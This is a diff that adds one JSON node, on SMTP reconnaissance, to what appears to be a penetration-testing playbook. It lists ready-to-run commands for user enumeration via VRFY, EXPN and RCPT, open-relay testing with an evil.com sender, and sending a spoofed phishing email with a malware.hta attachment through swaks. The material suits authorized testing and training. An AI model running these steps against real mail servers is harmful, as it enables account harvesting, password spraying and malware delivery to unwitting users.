@@ -1,0 +1,22 @@
+{
+  "id": "smtp_enum",
+  "phase": "RECON",
+  "title": "SMTP (25/465/587)",
+  "body": "SMTP leaks usernames via VRFY/EXPN/RCPT. Valid users feed your spray lists. Open relay lets you send phishing emails internally.",
+  "cmd": "nmap -p 25,465,587 --script smtp-commands,smtp-enum-users,smtp-ntlm-info $ip\n\n# Banner grab\nnc $ip 25\ntelnet $ip 25\n\n# VRFY — user enumeration (most common)\ntelnet $ip 25\nEHLO test\nVRFY root\nVRFY admin\nVRFY www-data\n\n# EXPN — expand mailing lists\nEXPN admins\nEXPN all\n\n# RCPT TO — enumerate valid users\nMAIL FROM:<test@test.com>\nRCPT TO:<admin@$domain>   # 250=exists  550=not found\n\n# Automated user enum\nsmtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t $ip\nsmtp-user-enum -M RCPT -U users.txt -t $ip -f sender@test.com\n\n# Open relay test\ntelnet $ip 25\nEHLO test\nMAIL FROM:<attacker@evil.com>\nRCPT TO:<victim@external.com>   # 250 = open relay\n\n# Send phishing if open relay (client-side attacks)\nswaks --to victim@$domain --from \"it@$domain\" \\\n  --server $ip --attach malware.hta",
+  "warn": "VRFY and EXPN are often disabled on hardened servers. RCPT TO is less likely to be blocked.",
+  "choices": [
+    {
+      "label": "Enumerated valid users — spray them",
+      "next": "ad_spray"
+    },
+    {
+      "label": "Open relay — send phishing for client-side",
+      "next": "client_side"
+    },
+    {
+      "label": "Found NTLM info — extract domain info",
+      "next": "ad_start"
+    }
+  ]
+}
